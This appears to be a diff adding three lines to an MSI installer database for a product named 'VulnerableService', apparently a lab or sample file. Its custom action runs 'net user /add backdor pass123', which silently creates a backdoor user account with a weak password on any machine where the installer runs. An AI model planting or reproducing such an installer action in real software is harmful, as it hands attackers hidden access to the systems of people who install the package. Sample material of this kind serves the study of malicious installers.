@@ -1,0 +1,3 @@
+[MSI DATABASE]
+Property: ProductName = VulnerableService
+CustomAction: net user /add backdor pass123
